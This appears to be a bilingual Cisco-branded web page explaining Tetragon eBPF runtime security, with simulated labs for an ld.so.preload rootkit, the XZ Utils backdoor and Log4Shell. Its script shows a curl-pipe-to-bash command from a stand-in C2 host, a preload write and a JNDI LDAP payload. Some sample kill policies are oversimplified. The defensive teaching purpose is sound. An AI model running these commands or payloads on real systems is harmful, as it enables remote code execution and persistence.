<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Cisco Security Insight: Tetragon & eBPF Comprehensive Guide</title>
    <style>
        /* --- Cisco Brand Identity System --- */
        :root {
            --cisco-blue: #049FD9;
            --cisco-midnight: #0D274D;
            --cisco-sky: #6ABF4B;
            --cisco-slate: #58585B;
            --cisco-light-gray: #F2F2F2;
            --cisco-platinum: #E4E4E4;
            --cisco-green: #6CC24A;
            --cisco-red: #E2231A;
            --cisco-orange: #F58025;
            --white: #FFFFFF;
            --shadow-card: 0 8px 24px rgba(13, 39, 77, 0.08);
            --shadow-hover: 0 12px 32px rgba(13, 39, 77, 0.15);
            --radius-sm: 4px;
            --radius-md: 8px;
            --radius-lg: 16px;
        }

        /* --- Typography & Base --- */
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-font-smoothing: antialiased; }
        
        body {
            font-family: "SF Pro Text", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: var(--cisco-slate);
            background-color: #FAFAFA;
            line-height: 1.6;
        }

        h1, h2, h3, h4 { color: var(--cisco-midnight); font-weight: 700; letter-spacing: -0.5px; }
        p { margin-bottom: 1.2rem; font-size: 1.05rem; }
        
        /* --- Language Toggling --- */
        body.lang-zh .lang-en { display: none !important; }
        body.lang-en .lang-zh { display: none !important; }

        .lang-switch {
            position: absolute; top: 20px; right: 20px; z-index: 100;
            background: rgba(255, 255, 255, 0.15); border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 20px; padding: 4px; display: flex; backdrop-filter: blur(4px);
        }

        .lang-btn {
            background: transparent; border: none; color: rgba(255, 255, 255, 0.7);
            padding: 6px 16px; border-radius: 16px; font-size: 0.85rem; font-weight: 600;
            cursor: pointer; transition: all 0.2s;
        }

        .lang-btn.active { background: white; color: var(--cisco-midnight); box-shadow: 0 2px 8px rgba(0,0,0,0.2); }

        /* --- Layout --- */
        .container { max-width: 1100px; margin: 0 auto; padding: 0 24px; }
        section { padding: 80px 0; border-bottom: 1px solid var(--cisco-platinum); background: var(--white); }
        section:nth-child(even) { background: #F9FAFB; }

        /* --- Header / Hero --- */
        header {
            background: linear-gradient(135deg, var(--cisco-midnight) 0%, #005073 100%);
            color: white; padding: 100px 0 80px; position: relative;
            clip-path: polygon(0 0, 100% 0, 100% 90%, 0 100%);
        }

        .hero-tag {
            background: rgba(255,255,255,0.1); color: #61C6E2; padding: 6px 16px;
            border-radius: 20px; font-size: 0.85rem; font-weight: 600;
            text-transform: uppercase; letter-spacing: 1px; display: inline-block;
            margin-bottom: 24px; border: 1px solid rgba(4, 159, 217, 0.3);
        }

        h1 { color: white; font-size: 3rem; margin-bottom: 20px; line-height: 1.1; }
        .hero-sub { font-size: 1.25rem; color: rgba(255,255,255,0.85); max-width: 700px; margin-bottom: 40px; }

        /* --- Section Titles --- */
        .section-header { text-align: center; max-width: 850px; margin: 0 auto 60px; }
        .section-header h2 { font-size: 2.25rem; margin-bottom: 16px; position: relative; display: inline-block; }
        .section-header h2::after {
            content: ''; display: block; width: 60px; height: 4px; background: var(--cisco-blue);
            margin: 12px auto 0; border-radius: 2px;
        }

        /* --- Grid & Cards --- */
        .grid-3 { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 32px; }
        .grid-4 { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 24px; }
        
        .card {
            background: white; padding: 35px 28px; border-radius: var(--radius-lg);
            box-shadow: var(--shadow-card); transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
            border-top: 4px solid transparent; height: 100%;
        }
        .card:hover { transform: translateY(-8px); box-shadow: var(--shadow-hover); border-top-color: var(--cisco-blue); }
        
        /* --- Sequential Perspectives --- */
        .view-section { margin-bottom: 60px; }
        .view-title { 
            color: var(--cisco-midnight); font-size: 1.6rem; margin-bottom: 25px; 
            border-bottom: 2px solid var(--cisco-platinum); padding-bottom: 10px;
            display: flex; align-items: center; gap: 12px;
        }
        .view-title::before { content: ""; display: block; width: 4px; height: 1.2em; background: var(--cisco-blue); border-radius: 2px; }

        .highlight-box {
            background: #F0F7FA; border-left: 4px solid var(--cisco-blue);
            padding: 25px; border-radius: 0 var(--radius-md) var(--radius-md) 0;
            margin: 30px 0;
        }

        /* --- Mechanism Description Blocks --- */
        .mechanism-card {
            background: #FFFFFF; border: 1px solid var(--cisco-platinum);
            border-radius: 12px; padding: 35px; margin-bottom: 40px;
            box-shadow: var(--shadow-card);
        }
        .mechanism-card h4 { color: var(--cisco-blue); margin-bottom: 15px; border-left: 4px solid var(--cisco-blue); padding-left: 15px; font-size: 1.4rem; }

        /* --- Linux Terminal --- */
        .terminal {
            background: #111111; border-radius: var(--radius-md); overflow: hidden;
            font-family: 'Courier New', monospace; box-shadow: 0 20px 50px rgba(0,0,0,0.3); margin-top: 20px;
            border: 1px solid #333;
        }
        .terminal-bar { background: #2A2A2A; padding: 12px; display: flex; gap: 8px; align-items: center; }
        .traffic-light { width: 12px; height: 12px; border-radius: 50%; }
        .terminal-content { padding: 20px; min-height: 250px; color: #EEE; font-size: 14px; overflow-y: auto; }
        .prompt { color: var(--cisco-green); font-weight: bold; }
        .alert-text { color: var(--cisco-red); font-weight: bold; background: rgba(226, 35, 26, 0.1); padding: 2px 6px; border-radius: 4px; }
        .cursor { display: inline-block; width: 10px; height: 18px; background: #CCC; animation: blink 1s infinite; vertical-align: middle;}
        @keyframes blink { 50% { opacity: 0; } }

        /* --- Code & YAML Blocks --- */
        .yaml-block {
            background: #1E1E1E; border-radius: var(--radius-md); padding: 24px;
            font-family: 'Consolas', monospace; font-size: 0.9rem; color: #D4D4D4;
            border-left: 4px solid var(--cisco-green); overflow-x: auto; white-space: pre; margin: 20px 0;
        }
        .yaml-key { color: #569CD6; font-weight: bold; }
        .yaml-val { color: #CE9178; }
        .yaml-action { color: #C586C0; font-weight: bold; }

        /* --- Dashboard Mockup --- */
        .dashboard-mock {
            background: #1C222D; border-radius: 12px; padding: 25px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.3); margin-top: 30px;
        }
        .dash-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
        .dash-widget { background: #262E3D; border-radius: 8px; padding: 15px; display: flex; flex-direction: column; min-height: 100px; border: 1px solid rgba(255,255,255,0.05); }
        .dash-label { color: #888; font-size: 0.75rem; margin-bottom: 5px; }
        .dash-value { color: var(--cisco-blue); font-size: 1.6rem; font-weight: bold; margin-top: auto; }

        /* --- Final Conclusion Section --- */
        .final-conclusion { 
            background-color: var(--cisco-midnight) !important; 
            padding: 100px 0; 
            color: #FFFFFF !important; 
            border-bottom: none;
        }
        .final-conclusion h2 { 
            color: #FFFFFF !important; 
            text-align: center; 
            margin-bottom: 40px; 
            font-size: 2.5rem; 
        }
        .final-conclusion h2::after { 
            content: ''; display: block; width: 80px; height: 4px; background: var(--cisco-blue); margin: 20px auto 0;
        }
        .conclusion-core { 
            color: #FFFFFF !important; 
            font-size: 1.35rem; 
            max-width: 900px; 
            margin: 0 auto 60px; 
            text-align: center; 
            line-height: 1.8; 
            font-weight: 500;
            background: rgba(255,255,255,0.05);
            padding: 30px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .conclusion-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
            gap: 40px; 
            max-width: 1000px; 
            margin: 0 auto; 
        }
        .conclusion-item { 
            background: rgba(255,255,255,0.08); 
            padding: 35px; 
            border-radius: 16px; 
            border: 1px solid rgba(255,255,255,0.15); 
        }
        .conclusion-item strong { 
            color: var(--cisco-blue); 
            display: block; 
            margin-bottom: 15px; 
            font-size: 1.25rem; 
        }
        .conclusion-item p { 
            color: #FFFFFF !important; 
            font-size: 1.05rem; 
            margin-bottom: 0; 
            opacity: 0.95;
            line-height: 1.6;
        }

        .btn-primary { background: var(--cisco-blue); color: white; border: none; padding: 14px 32px; border-radius: 30px; font-weight: 600; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 12px rgba(4, 159, 217, 0.3); }
        .btn-primary:hover { background: #0087BF; transform: translateY(-2px); }
        .btn-outline { background: transparent; border: 2px solid var(--cisco-blue); color: var(--cisco-blue); padding: 14px 32px; border-radius: 30px; font-weight: 600; cursor: pointer; transition: 0.2s; }
        .btn-outline:hover { background: var(--cisco-blue); color: white; }
        
        .divider { border: 0; height: 1px; background: linear-gradient(to right, transparent, #D1D9E0, transparent); margin: 60px 0; }
        .case-badge { background: var(--cisco-midnight); color: white; padding: 4px 12px; border-radius: 4px; font-size: 0.8rem; font-weight: 700; margin-bottom: 15px; display: inline-block; text-transform: uppercase; }

        @media (max-width: 768px) {
            h1 { font-size: 2.2rem; }
            .grid-3, .grid-4, .dash-grid { grid-template-columns: 1fr; }
            .final-conclusion { padding: 60px 0; }
        }
    </style>
</head>
<body class="lang-zh">

    <!-- Hero Section -->
    <header>
        <div class="lang-switch">
            <button class="lang-btn active" id="btn-zh" onclick="setLanguage('zh')">中文</button>
            <button class="lang-btn" id="btn-en" onclick="setLanguage('en')">EN</button>
        </div>
        <div class="container">
            <div class="hero-tag">Cisco Technology Radar: eBPF & Tetragon</div>
            <h1>
                <span class="lang-zh">Tetragon:<br>云原生安全的最后一道防线</span>
                <span class="lang-en">Tetragon:<br>The Final Line of Defense for<br>Cloud-Native Security</span>
            </h1>
            <p class="hero-sub">
                <span class="lang-zh">在现代化的 IT 架构中，外围防火墙已不足以应对威胁。Tetragon 利用 eBPF 技术，将安全防御下沉至 Linux 内核最深处，实现真正的亚毫秒级实时阻断。</span>
                <span class="lang-en">In modern IT architectures, perimeter firewalls are no longer enough. Tetragon utilizes eBPF technology to embed security deep into the Linux kernel for true real-time enforcement.</span>
            </p>
            <div style="display:flex; gap:16px;">
                <button class="btn-primary" onclick="scrollToId('lab-section')">启动演练实验室</button>
                <button class="btn-outline" style="border-color:white; color:white;" onclick="scrollToId('how-it-works')">技术原理</button>
            </div>
        </div>
    </header>

    <!-- Section 1: Definition of Runtime Security -->
    <section id="what-is-runtime">
        <div class="container">
            <div class="section-header">
                <h2>什么是运行时安全？ (What)</h2>
                <p>运行时安全是指在应用程序<b>执行过程中</b>对其进行监控和防护。它关注的是“现在正在发生什么”，而不是代码在构建时是什么样子。</p>
            </div>

            <div class="view-section">
                <div class="highlight-box">
                    <strong>核心价值：弥补“左移安全”的盲区</strong>
                    <p>即使镜像扫描和静态配置分析（Shift Left）是完美的，也无法覆盖 0-day 漏洞利用、供应链污染或运行时的特权提升。运行时安全提供 <b>“Shield Right”</b>，在恶意行为发生的瞬间构建最后一道防线。</p>
                </div>
            </div>

            <div class="view-section">
                <div class="view-title">主要监控维度</div>
                <div class="grid-4">
                    <div class="card" style="border-top-color: var(--cisco-blue);">
                        <strong>进程执行</strong>
                        <p style="font-size: 0.9rem;">追踪二进制文件的全生命周期：谁启动了程序？是否派生了非法的子进程或 Shell？</p>
                    </div>
                    <div class="card" style="border-top-color: var(--cisco-blue);">
                        <strong>文件访问</strong>
                        <p style="font-size: 0.9rem;">监控关键路径：敏感配置文件（如 <code>/etc/shadow</code>）是否被未授权篡改或非法读取？</p>
                    </div>
                    <div class="card" style="border-top-color: var(--cisco-blue);">
                        <strong>网络通信</strong>
                        <p style="font-size: 0.9rem;">感知连接意图：进程是否建立了非预期的外连或尝试访问恶意的 C2 域名？</p>
                    </div>
                    <div class="card" style="border-top-color: var(--cisco-blue);">
                        <strong>特权变更</strong>
                        <p style="font-size: 0.9rem;">识别越权行为：普通用户进程是否突然提权变成 Root？是否发生了异常的 Capability 变更？</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Section 2: Sequential Perspectives -->
    <section id="perspectives">
        <div class="container">
            <div class="view-section">
                <div class="view-title">业务视角 (类比)</div>
                <div class="grid-3">
                    <div class="card">
                        <h3>传统安全：摄像头</h3>
                        <p>日志分析就像摄像头。它能录下攻击过程，但当你发现时，损害已经造成。这是<b>“异步检测”</b>。</p>
                    </div>
                    <div class="card">
                        <h3>Sidecar：安检门</h3>
                        <p>Sidecar 代理就像在房间设安检。虽然能阻拦，但每个人进出都要排队，导致性能损耗巨大且极易被绕过。</p>
                    </div>
                    <div class="card">
                        <h3>Tetragon：智能免疫</h3>
                        <p>驻扎在内核中。识别到病毒直接在内核态阻断（Kill）。这是<b>“同步强制执行”</b>。</p>
                    </div>
                </div>
            </div>

            <div class="view-section">
                <div class="view-title">架构视角 (技术)</div>
                <div class="grid-3">
                    <div class="card">
                        <h3>内核级可观测性</h3>
                        <p>利用 eBPF，在不修改内核源码的情况下，安全地动态追踪内核函数（kprobes）和系统调用。</p>
                    </div>
                    <div class="card">
                        <h3>零开销上下文映射</h3>
                        <p>Tetragon 维护内核内状态表，能即时将低层调用映射到 K8s Pod, Namespace 等高层元数据。</p>
                    </div>
                    <div class="card">
                        <h3>In-Kernel Enforcement</h3>
                        <p>使用 <code>bpf_send_signal</code> 在恶意 syscall 完成前终止进程，杜绝 TOCTOU 类型攻击。</p>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Section 3: Defense Scenarios & Value -->
    <section id="scenarios" style="background: #F9FAFB;">
        <div class="container">
            <div class="section-header">
                <h2>应用场景与防御价值 (Value)</h2>
                <p>将安全策略下沉到内核，构建不可绕过的运行时防御边界。</p>
            </div>
            <div class="grid-4">
                <div class="card" style="border-top-color: var(--cisco-red);">
                    <strong>深度防御 (Security)</strong>
                    <ul style="font-size: 0.85rem; list-style: none; margin-top:10px;">
                        <li style="margin-bottom:8px;">• <b>文件篡改：</b> 监控 <code>/etc/passwd</code> 的 <code>write</code> 行为，拦截持久化驻留。</li>
                        <li style="margin-bottom:8px;">• <b>反弹 Shell：</b> 监控 <code>connect</code> 和 <code>execve</code>，禁止非白名单外连。</li>
                        <li>• <b>容器逃逸：</b> 强制执行 Namespace 隔离，禁止非法的宿主机挂载。</li>
                    </ul>
                </div>
                <div class="card" style="border-top-color: var(--cisco-sky);">
                    <strong>安全合规 (Compliance)</strong>
                    <p style="font-size: 0.85rem; margin-top: 10px;">检测容器内执行 <code>curl</code> 或 <code>apt-get</code> 等违规命令。通过行为白名单确保生产环境的“不可变性”。</p>
                </div>
                <div class="card" style="border-top-color: var(--cisco-blue);">
                    <strong>故障排查 & 零信任</strong>
                    <p style="font-size: 0.85rem; margin-top: 10px;">通过监控 TCP SYN 重传，定位网络延迟。基于进程身份执行“最小权限访问”策略。</p>
                </div>
                <div class="card" style="border-top-color: var(--cisco-midnight);">
                    <strong>取证分析 (Forensics)</strong>
                    <p style="font-size: 0.85rem; margin-top: 10px;">入侵发生后，通过 Tetragon 的祖先进程树回溯攻击者的横向移动轨迹和指令序列。</p>
                </div>
            </div>
        </div>
    </section>

    <!-- Section 4: Visual Architecture -->
    <section id="how-it-works">
        <div class="container">
            <div class="section-header">
                <h2>工作原理可视化</h2>
            </div>
            <div style="background: white; padding: 40px; border-radius: 16px; box-shadow: var(--shadow-card); display: flex; flex-direction: column; align-items: center;">
                <svg width="100%" height="300" viewBox="0 0 800 300">
                    <rect x="50" y="20" width="700" height="80" rx="8" fill="#F0F8FC" stroke="#049FD9" stroke-width="2" stroke-dasharray="5,5"/>
                    <text x="60" y="45" font-weight="bold" fill="#0D274D">User Space</text>
                    <circle cx="200" cy="60" r="25" fill="white" stroke="#049FD9" stroke-width="2"/><text x="200" y="65" text-anchor="middle" font-size="10" fill="#049FD9">App</text>
                    <rect x="50" y="140" width="700" height="140" rx="8" fill="#0D274D" />
                    <text x="60" y="165" font-weight="bold" fill="white">Kernel Space (eBPF Shield)</text>
                    <line x1="200" y1="100" x2="200" y2="160" stroke="#049FD9" stroke-width="3" stroke-dasharray="4"/>
                    <rect x="150" y="180" width="120" height="60" rx="4" fill="#005073" stroke="#6CC24A" stroke-width="2"/><text x="210" y="215" text-anchor="middle" fill="white" font-weight="bold" font-size="12">eBPF Hook</text>
                    <rect x="380" y="180" width="150" height="60" rx="4" fill="#6CC24A"/><text x="455" y="215" text-anchor="middle" fill="#0D274D" font-weight="bold" font-size="12">Policy Check</text>
                    <rect x="620" y="180" width="100" height="60" rx="4" fill="#E2231A"/><text x="670" y="215" text-anchor="middle" fill="white" font-weight="bold" font-size="12">SIGKILL</text>
                </svg>
            </div>
        </div>
    </section>

    <!-- Section 5: Network Observability -->
    <section>
        <div class="container">
            <div class="section-header">
                <h2>性能优势与网络观测</h2>
                <p>利用 eBPF 实现零 Sidecar 的高性能网络观测，深度解构 L3 到 L7（DNS, TLS）流量。</p>
            </div>
            <div style="display: flex; flex-wrap: wrap; gap: 40px; align-items: flex-start;">
                <div style="flex: 1; min-width: 320px;">
                    <h3>L7 层级无代理监控</h3>
                    <p>Tetragon 不需要 Sidecar 代理即可追踪 L3/L4 流量及 DNS、TLS 握手。通过监控 TCP SYN 重传，运维团队可以即时定位由底层网络导致的连接超时。</p>
                    <div class="dashboard-mock">
                        <div class="dash-grid">
                            <div class="dash-widget"><span class="dash-label">TCP Retransmits</span><span class="dash-value" style="color:var(--cisco-orange)">14</span></div>
                            <div class="dash-widget"><span class="dash-label">DNS Success Rate</span><span class="dash-value">99.8%</span></div>
                            <div class="dash-widget"><span class="dash-label">TLS SNI Identified</span><span class="dash-value">42</span></div>
                            <div class="dash-widget"><span class="dash-label">P99 Latency</span><span class="dash-value">0.8ms</span></div>
                        </div>
                    </div>
                </div>
                <div style="flex: 1; min-width: 320px; background: white; padding: 25px; border-radius: 12px; box-shadow: var(--shadow-card);">
                    <h3>性能损耗对比</h3>
                    <p style="font-size: 0.9rem;">传统 EDR 方案损耗高达 20%，Tetragon 强制执行损耗 <b>< 1%</b>。</p>
                    <svg width="100%" height="160" viewBox="0 0 400 160">
                        <line x1="50" y1="140" x2="350" y2="140" stroke="#CCC" stroke-width="2"/>
                        <rect x="100" y="30" width="50" height="110" fill="#F58025" opacity="0.8"/><text x="125" y="155" text-anchor="middle" font-size="10">Legacy</text>
                        <rect x="250" y="132" width="50" height="8" fill="#049FD9"/><text x="275" y="155" text-anchor="middle" font-size="10">Tetragon</text>
                    </svg>
                </div>
            </div>
        </div>
    </section>

    <!-- Section 6: Live Defense Simulation Lab -->
    <section id="lab-section" style="background: #F9FAFB;">
        <div class="container">
            <div class="section-header">
                <h2>实时攻防演练实验室</h2>
                <p>在不干扰业务的前提下，沉浸式体验内核级威胁阻断。请在下方实验场景中点击“运行演练”。</p>
            </div>

            <!-- LAB 1: ROOTKIT -->
            <div class="mechanism-card">
                <div class="case-badge">Scenario I</div>
                <h4>Rootkit 持久化拦截</h4>
                <div class="view-section">
                    <p><strong>攻击原理：劫持动态链接。</strong>攻击者常尝试修改系统关键配置文件 <code>/etc/ld.so.preload</code>。在该文件中添加恶意动态库路径后，系统在启动任何新进程时都会强制加载该恶意库。这使得黑客能劫持系统函数（如 <code>read</code>, <code>write</code>, <code>execve</code>），实现完全的“隐身”监控和后门持久化。</p>
                    <p><strong>Tetragon 对策：</strong>配置监控该文件的 <code>sys_openat</code> 调用。一旦检测到尝试以“写入”模式打开该文件的非预期进程（如 Shell 脚本），Tetragon 会立即实施内核级阻断。</p>
                </div>
                
                <div class="yaml-block">
<span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"protect-ld-so-preload"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_openat"</span>
    <span class="yaml-key">syscall</span>: <span class="yaml-val">true</span>
    <span class="yaml-key">args</span>:
    - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
      <span class="yaml-key">type</span>: <span class="yaml-val">"string"</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchArgs</span>:
      - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
        <span class="yaml-key">operator</span>: <span class="yaml-val">"Equal"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"/etc/ld.so.preload"</span>]
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>

                <div style="display: flex; gap: 12px; margin-top: 15px;">
                    <button class="btn-primary" onclick="runAttackSequence()" id="attackBtn">运行演练</button>
                    <button class="btn-outline" onclick="resetTerminal('termOutput')">重置终端</button>
                </div>
                <div class="terminal">
                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div><span style="margin-left: 10px; color: #888; font-size: 0.7rem;">ssh root@prod-node-01</span></div>
                    <div class="terminal-content" id="termOutput">
                        <div class="output-text">Last login: Fri Dec 19 19:01:25 from 10.24.5.12</div>
                        <div><span class="prompt">root@prod-node:~#</span> <span class="cursor"></span></div>
                    </div>
                </div>
            </div>

            <!-- LAB 2: XZ UTILS -->
            <div class="mechanism-card">
                <div class="case-badge">Scenario II</div>
                <h4>XZ Utils 供应链攻击 (CVE-2024-3094)</h4>
                <div class="view-section">
                    <p><strong>攻击机理：IFUNC 劫持。</strong>XZ 后门利用了 GNU 链接器的 <b>Indirect Function (IFUNC)</b> 机制。攻击者注入恶意 SO，在 <code>sshd</code> 加载 <code>liblzma</code> 时通过间接函数解析将正常的 RSA 认证逻辑替换为后门逻辑。这种“内存中后门”不会在磁盘上留下异常痕迹。</p>
                    <p><strong>检测与阻断：</strong>由于后门激活后必须通过 <code>execve</code> 派生子进程才能执行恶意命令，Tetragon 通过锁定 <code>sshd</code> 二进制路径，感应并杀掉非预期的 <code>/bin/sh</code> 派生行为。</p>
                </div>
                
                <div class="yaml-block">
<span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"block-sshd-fork"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_execve"</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchBinaries</span>:
      - <span class="yaml-key">operator</span>: <span class="yaml-val">"In"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"/usr/sbin/sshd"</span>]
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>

                <div style="display: flex; gap: 12px; margin-top: 15px;">
                    <button class="btn-primary" onclick="runXZSimulation()" id="xzBtn" style="background:var(--cisco-midnight);">发起 XZ 模拟攻击</button>
                </div>
                <div class="terminal">
                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div><span style="margin-left: 10px; color: #888; font-size: 0.7rem;">Simulation: XZ Backdoor</span></div>
                    <div class="terminal-content" id="xzOutput">
                        <div class="output-text"># Tetragon: monitoring /usr/sbin/sshd for anomalous forks...</div>
                        <div><span class="prompt">root@prod-node:~$</span> <span class="cursor"></span></div>
                    </div>
                </div>
            </div>

            <!-- LAB 3: LOG4SHELL -->
            <div class="mechanism-card">
                <div class="case-badge">Scenario III</div>
                <h4>Log4Shell 漏洞防护 (CVE-2021-44228)</h4>
                <div class="view-section">
                    <p><strong>JNDI 注入原理：递归解析劫持。</strong>Log4j 库在处理日志时会递归解析 <code>${jndi:ldap://...}</code> 字符串。这强制 Java 应用连接远程服务器下载并执行恶意字节码。这是典型的从“合规应用层行为”转化为“恶意内核级行为”的案例。</p>
                    <p><strong>运行时补救：</strong>通过 Tetragon 实施<b>“虚拟补丁 (Virtual Patching)”</b>。即使应用未升级，只要通过策略禁止 Java 进程调用 <code>execve</code> 启动不受信的 Shell，就能在 RCE 发生的瞬间切断攻击链。</p>
                </div>

                <div class="yaml-block">
<span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
<span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
<span class="yaml-key">metadata</span>:
  <span class="yaml-key">name</span>: <span class="yaml-val">"block-java-fork"</span>
<span class="yaml-key">spec</span>:
  <span class="yaml-key">kprobes</span>:
  - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_execve"</span>
    <span class="yaml-key">selectors</span>:
    - <span class="yaml-key">matchBinaries</span>:
      - <span class="yaml-key">operator</span>: <span class="yaml-val">"In"</span>
        <span class="yaml-key">values</span>: [<span class="yaml-val">"/usr/bin/java"</span>]
      <span class="yaml-key">matchActions</span>:
      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>

                <div style="display: flex; gap: 12px; margin-top: 15px;">
                    <button class="btn-primary" onclick="runLog4jSimulation()" id="log4jBtn" style="background:var(--cisco-orange);">模拟 Log4Shell 攻击</button>
                </div>
                <div class="terminal">
                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div><span style="margin-left: 10px; color: #888; font-size: 0.7rem;">Simulation: Log4Shell Exploit</span></div>
                    <div class="terminal-content" id="log4jOutput">
                        <div class="output-text"># Tetragon watching Java process (pid: 550) for suspicious execve()...</div>
                        <div><span class="prompt">root@java-app:~$</span> <span class="cursor"></span></div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- FINAL CONCLUSION SECTION -->
    <section class="final-conclusion">
        <div class="container">
            <h2>总结与核心见解</h2>
            <div class="conclusion-core">
                Tetragon 的核心价值在于将安全从“基于已知签名的被动防御”转变为“基于预期行为的主动策略”。
            </div>
            <div class="conclusion-grid">
                <div class="conclusion-item">
                    <strong>内核态强制执行</strong>
                    <p>利用 eBPF 的高性能钩子，在系统调用层面实现亚毫秒级的防御响应，确保在恶意操作发生前即刻阻断。</p>
                </div>
                <div class="conclusion-item">
                    <strong>零信任运行时</strong>
                    <p>不假设任何进程是安全的。通过深层上下文感知（用户、二进制路径、命名空间），仅允许白名单内的合法操作。</p>
                </div>
                <div class="conclusion-item">
                    <strong>极低性能损耗</strong>
                    <p>在内核空间完成过滤，规避了昂贵的上下文切换开销，确保为高性能生产业务提供坚如磐石的保护。</p>
                </div>
            </div>
        </div>
    </section>

    <footer>
        <div class="container" style="text-align: center; color: #999; font-size: 0.9rem; padding: 40px 0;">
            <p>&copy; 2025 Cisco Security Insight. Powered by eBPF & Tetragon.</p>
        </div>
    </footer>

    <script>
        let currentLang = 'zh';

        function setLanguage(lang) {
            currentLang = lang;
            document.body.className = 'lang-' + lang;
            document.getElementById('btn-zh').classList.toggle('active', lang === 'zh');
            document.getElementById('btn-en').classList.toggle('active', lang === 'en');
        }

        function scrollToId(id) { document.getElementById(id).scrollIntoView({ behavior: 'smooth' }); }

        function resetTerminal(targetId) {
            const el = document.getElementById(targetId);
            const promptMap = { 'termOutput': 'root@prod-node:~#', 'xzOutput': 'root@prod-node:~$', 'log4jOutput': 'root@java-app:~$' };
            el.innerHTML = `<div class="output-text">Terminal reset...</div><div><span class="prompt">${promptMap[targetId]}</span> <span class="cursor"></span></div>`;
        }

        async function typeWriter(text, element) {
            for (let char of text) { element.innerHTML += char; await new Promise(r => setTimeout(r, 25)); }
        }

        async function runAttackSequence() {
            const btn = document.getElementById('attackBtn');
            const term = document.getElementById('termOutput');
            btn.disabled = true;
            const lastLine = term.lastElementChild;
            lastLine.querySelector('.cursor').style.display = 'none';
            await typeWriter('curl -fsSL http://evil-c2.com/setup.sh | bash', lastLine.querySelector('.prompt').nextElementSibling);
            await new Promise(r => setTimeout(r, 600));
            term.innerHTML += `<div class="output-text" style="color: var(--cisco-orange); border-left: 2px solid var(--cisco-orange); padding-left: 8px;">[Tetragon] ⚠️ Detected suspicious egress to evil-c2.com:80.</div>`;
            await new Promise(r => setTimeout(r, 500));
            term.innerHTML += `<div><span class="prompt">root@prod-node:~#</span> <span class="cmd-text">echo "root_kit" >> /etc/ld.so.preload</span></div>`;
            await new Promise(r => setTimeout(r, 600));
            term.innerHTML += `<div><span class="alert-text">BLOCK</span> <span style="color: var(--cisco-red);">SIGKILL: Process 'bash' terminated (Violation: sys-file-integrity)</span></div>`;
            term.innerHTML += `<div><span class="prompt">root@prod-node:~#</span> <span class="cursor"></span></div>`;
            btn.disabled = false;
        }

        async function runXZSimulation() {
            const btn = document.getElementById('xzBtn');
            const term = document.getElementById('xzOutput');
            btn.disabled = true;
            const lastLine = term.lastElementChild;
            lastLine.querySelector('.cursor').style.display = 'none';
            await typeWriter('ssh attacker@prod-node -p 22', lastLine.querySelector('.prompt').nextElementSibling);
            await new Promise(r => setTimeout(r, 800));
            term.innerHTML += `<div class="output-text">Verifying RSA key via liblzma (IFUNC resolution)...</div>`;
            await new Promise(r => setTimeout(r, 1000));
            term.innerHTML += `<div><span class="alert-text">XZ-HIJACK</span> <span style="color: var(--cisco-red);">Malicious signature matched! Backdoor code activated.</span></div>`;
            await new Promise(r => setTimeout(r, 600));
            term.innerHTML += `<div><span class="alert-text">KILL</span> <span style="color: #ff5f56;">Tetragon killed sshd (PID 3012). Blocked fork(/bin/sh)</span></div>`;
            term.innerHTML += `<div><span class="prompt">root@prod-node:~$</span> <span class="cursor"></span></div>`;
            btn.disabled = false;
        }

        async function runLog4jSimulation() {
            const btn = document.getElementById('log4jBtn');
            const term = document.getElementById('log4jOutput');
            btn.disabled = true;
            const lastLine = term.lastElementChild;
            lastLine.querySelector('.cursor').style.display = 'none';
            await typeWriter('curl -H "User-Agent: ${jndi:ldap://attacker.io/X}" http://api-gw', lastLine.querySelector('.prompt').nextElementSibling);
